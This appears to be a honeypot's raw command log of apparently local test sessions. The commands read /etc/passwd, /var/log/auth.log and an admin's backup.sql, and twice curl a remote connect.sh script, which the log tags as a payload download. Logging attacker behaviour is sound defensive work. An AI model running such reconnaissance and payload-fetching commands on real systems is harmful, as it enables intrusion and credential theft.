2025-12-21 08:18:41.396471 ('127.0.0.1', 60068) CMD=
2026-01-29 07:17:37.024124 ('127.0.0.1', 49508) CMD=ls CWD=/etc
2026-01-29 07:17:42.838134 ('127.0.0.1', 49508) CMD=cat passwd CWD=/etc
2026-01-29 07:18:50.954503 ('127.0.0.1', 49508) CMD=whoami CWD=/etc
2026-02-27 08:57:27.165601 ('127.0.0.1', 49396) CMD=ls CWD=/
2026-02-27 08:57:31.834098 ('127.0.0.1', 49396) CMD=cd etc CWD=/etc
2026-02-27 08:57:34.144596 ('127.0.0.1', 49396) CMD=ls CWD=/etc
2026-02-27 08:58:47.841049 ('127.0.0.1', 49396) CMD=ipconfig CWD=/etc
2026-02-27 08:58:54.992894 ('127.0.0.1', 49396) CMD=ifconfig CWD=/etc
2026-02-27 08:59:35.754914 ('127.0.0.1', 49396) CMD=whoami CWD=/etc
2026-02-27 09:01:38.537873 ('127.0.0.1', 49396) CMD=cat pwd CWD=/etc
2026-02-27 09:01:48.098282 ('127.0.0.1', 49396) CMD=cat passwd CWD=/etc
2026-03-15 12:05:30.822911 ('127.0.0.1', 54664) CMD=ls CWD=/
2026-03-15 12:05:35.803889 ('127.0.0.1', 54664) CMD=cd stc CWD=/
2026-03-15 12:05:39.697679 ('127.0.0.1', 54664) CMD=ls CWD=/
2026-03-15 12:05:44.033368 ('127.0.0.1', 54664) CMD=cd etc CWD=/etc
2026-03-15 12:05:45.463353 ('127.0.0.1', 54664) CMD=ls CWD=/etc
2026-03-15 12:05:56.203627 ('127.0.0.1', 54664) CMD=cd passwd CWD=/etc
2026-03-15 12:06:07.297118 ('127.0.0.1', 54664) CMD=ls passwd CWD=/etc
2026-03-15 12:06:13.207618 ('127.0.0.1', 54664) CMD=cat passwd CWD=/etc
2026-03-15 12:06:25.107406 ('127.0.0.1', 54664) CMD=cd CWD=/etc
2026-03-15 12:06:36.296167 ('127.0.0.1', 54664) CMD=cd home CWD=/etc
2026-03-15 12:06:57.592115 ('127.0.0.1', 43590) CMD=ls CWD=/
2026-03-15 12:07:02.838139 ('127.0.0.1', 43590) CMD=cd home CWD=/home
2026-03-15 12:07:03.866048 ('127.0.0.1', 43590) CMD=ls CWD=/home
2026-03-15 12:07:11.515360 ('127.0.0.1', 43590) CMD=cd admin CWD=/home/admin
2026-03-15 12:07:12.526760 ('127.0.0.1', 43590) CMD=ls CWD=/home/admin
2026-03-15 12:07:29.214081 ('127.0.0.1', 43590) CMD=cat backup.sql CWD=/home/admin
2026-03-15 12:30:40.448665 ('127.0.0.1', 48518) CMD=ls CWD=/
2026-03-15 12:30:45.856352 ('127.0.0.1', 48518) CMD=cd etc CWD=/etc
2026-03-15 12:30:50.644257 ('127.0.0.1', 48518) CMD=cd .. CWD=/
2026-03-15 12:30:53.562038 ('127.0.0.1', 48518) CMD=ls CWD=/
2026-03-15 12:30:59.381862 ('127.0.0.1', 48518) CMD=cd var CWD=/var
2026-03-15 12:31:00.324405 ('127.0.0.1', 48518) CMD=ls CWD=/var
2026-03-15 12:31:03.866239 ('127.0.0.1', 48518) CMD=cd log CWD=/var/log
2026-03-15 12:31:05.419898 ('127.0.0.1', 48518) CMD=ls CWD=/var/log
2026-03-15 12:31:14.174575 ('127.0.0.1', 48518) CMD=cat auth.log CWD=/var/log
2026-03-17 07:49:02.001663 ('127.0.0.1', 53798) CMD=ls CWD=/
2026-03-17 07:49:15.600711 ('127.0.0.1', 53798) CMD=touch test.txt CWD=/
2026-03-17 07:49:17.114535 ('127.0.0.1', 53798) CMD=ls CWD=/
2026-03-17 07:49:25.512523 ('127.0.0.1', 53798) CMD=rm test.txt CWD=/
2026-03-17 07:49:26.475313 ('127.0.0.1', 53798) CMD=ls CWD=/
2026-03-24 14:11:27.997480 ('127.0.0.1', 45932) CMD=ls  CWD=/
2026-03-24 14:11:30.774454 ('127.0.0.1', 45932) CMD=cd etc  CWD=/
2026-03-24 14:11:35.839347 ('127.0.0.1', 45932) CMD=ls  CWD=/etc
2026-03-24 14:15:44.054788 ('127.0.0.1', 43384) CMD=l  CWD=/
2026-03-24 14:15:44.191302 ('127.0.0.1', 43384) CMD=s  CWD=/
2026-03-24 14:15:45.801173 ('127.0.0.1', 43384) CMD=l  CWD=/
2026-03-24 14:15:45.901206 ('127.0.0.1', 43384) CMD=s  CWD=/
2026-03-24 14:15:46.764946 ('127.0.0.1', 43384) CMD=l  CWD=/
2026-03-24 14:15:46.912772 ('127.0.0.1', 43384) CMD=s  CWD=/
2026-03-24 14:15:47.076764 ('127.0.0.1', 43384) CMD=l  CWD=/
2026-03-24 14:15:47.197002 ('127.0.0.1', 43384) CMD=s  CWD=/
2026-03-24 14:15:47.362364 ('127.0.0.1', 43384) CMD=l  CWD=/
2026-03-24 14:15:54.923007 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:32.861069 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:34.560766 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:34.770200 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:35.141969 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:36.764086 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:17:37.005867 ('127.0.0.1', 43384) CMD=  CWD=/
2026-03-24 14:27:41.018374 ('127.0.0.1', 36034) CMD=ls  CWD=/
2026-03-24 14:28:15.025398 ('127.0.0.1', 36034) CMD=curl -O https://raw.githubusercontent.com/Dineshwer/temp/main/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
2026-03-24 14:28:17.884982 ('127.0.0.1', 36034) CMD=ls  CWD=/
2026-03-24 14:29:42.065951 ('127.0.0.1', 36034) CMD=touch a.text  CWD=/
2026-03-24 14:29:43.443623 ('127.0.0.1', 36034) CMD=ls  CWD=/
2026-03-24 14:38:03.687140 ('127.0.0.1', 36984) CMD=ls  CWD=/
2026-03-24 14:38:23.842971 ('127.0.0.1', 36984) CMD=curl -O https://raw.githubusercontent.com/Dineshwer/temp/main/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
2026-03-24 14:38:27.412436 ('127.0.0.1', 36984) CMD=ls  CWD=/
